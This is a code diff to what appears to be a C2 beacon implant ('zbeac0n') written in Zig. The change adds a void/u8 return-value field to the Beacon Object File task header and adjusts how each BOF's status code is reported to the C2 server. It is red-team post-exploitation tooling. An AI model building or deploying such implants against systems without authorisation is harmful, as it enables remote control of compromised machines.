@@ -399,15 +399,24 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
     defer allocator.free(bof_argv);
     _ = try b64_decoder.decode(bof_argv, bof_argv_b64);
 
-    // process BOF header { exec_mode:args_spec{iszZb}:bofHash:[persist] }
+    // process BOF header { exec_mode:args_spec{iszZb}:retValue{void|u8}:bofHash:[persist] }
     var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
 
     // get hint regarding execution mode
     const exec_mode = bof_header_iter.next() orelse return error.BadData;
 
+    // TODO: properly handle arg types!
     // get arguments specification string
     //const args_spec = bof_header_iter.next() orelse return error.BadData;
     _ = bof_header_iter.next() orelse return error.BadData;
+
+    // get BOF return value type
+    const no_ret_value = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "void") else false;
+    if(no_ret_value) {
+        std.log.info("ret value: void", .{});
+    }
+    else
+        std.log.info("ret value: u8", .{});
 
     // get BOF's hash
     const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
@@ -555,6 +564,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
             .context = context,
             .task_id = try allocator.dupe(u8, bof_task_id),
             .is_persistent = is_persistent,
+            .no_ret_value = no_ret_value,
         });
     } else return error.FailedToRunBof;
 }
@@ -564,7 +574,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_con
     defer task_fields.deinit();
 
     // handle task from C2, valid task's format:
-    // taskID,cmdName{type:name},[URI],[bofHeader{execMode,argTypes,bofHash,[persist]}],[base64(argv)]
+    // taskID,cmdName{type:name},[URI],[bofHeader{execMode:argTypes:retValue{void|u8}:bofHash:[persist]}],[base64(argv)]
     var iter_task = std.mem.splitScalar(u8, resp_content, ',');
 
     const task_id = iter_task.next() orelse return error.BadData;
@@ -695,11 +705,16 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *zbeac0n.State) !void
             .taskID = undefined,
         };
 
-        // checking status code
-        bof_res.status_code = if (pending_bof.context) |context|
-            @intCast(context.getExitCode())
-        else
-            pending_bof.launcher_error_code;
+        if(pending_bof.no_ret_value) {
+            bof_res.status_code = 0;
+        } else {
+
+            // checking status code
+            bof_res.status_code = if (pending_bof.context) |context|
+                @intCast(context.getExitCode())
+                else
+                    pending_bof.launcher_error_code;
+        }
 
         // getting task id
         const tempSlice = try allocator.dupeZ(u8, pending_bof.task_id);
